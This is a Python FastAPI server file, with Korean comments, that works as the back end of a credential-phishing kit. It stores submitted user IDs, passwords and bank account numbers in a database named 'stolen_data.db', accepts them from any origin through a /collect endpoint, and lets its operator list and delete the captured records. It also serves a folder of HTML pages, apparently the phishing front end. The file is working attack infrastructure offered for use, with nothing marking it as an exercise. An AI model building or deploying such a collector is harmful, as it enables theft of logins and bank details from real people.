from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles # 💡 새로 추가된 부품
from fastapi.responses import RedirectResponse
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, Integer, String, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import datetime
import uvicorn

DATABASE_URL = "sqlite:///./stolen_data.db"
Base = declarative_base()

class StolenInfo(Base):
    __tablename__ = "credentials"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String)  
    password = Column(String) 
    account_number = Column(String, nullable=True) 
    timestamp = Column(DateTime, default=datetime.datetime.now)

engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base.metadata.create_all(bind=engine)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

class InfoCreate(BaseModel):
    user_id: str
    password: str
    account_number: str = None

@app.post("/collect")
async def collect_data(info: InfoCreate):
    db = SessionLocal()
    new_data = StolenInfo(
        user_id=info.user_id, 
        password=info.password, 
        account_number=info.account_number
    )
    db.add(new_data)
    db.commit()
    db.close()
    return {"status": "success"}

@app.get("/logs")
async def get_logs():
    db = SessionLocal()
    logs = db.query(StolenInfo).order_by(StolenInfo.id.desc()).all()
    db.close()
    return logs

@app.delete("/logs/{log_id}")
async def delete_log(log_id: int):
    db = SessionLocal()
    target_log = db.query(StolenInfo).filter(StolenInfo.id == log_id).first()
    if target_log:
        db.delete(target_log)
        db.commit()
    db.close()
    return {"status": "success", "message": "삭제 완료"}

# 💡 [핵심 추가] public 폴더의 HTML 파일들을 서비스합니다.
# 이 코드는 반드시 API 라우터(/collect, /logs)들 보다 아래에 있어야 합니다.
app.mount("/", StaticFiles(directory="public", html=True), name="public")

if __name__ == "__main__":
    uvicorn.run("server:app", host="0.0.0.0", port=8000, reload=True)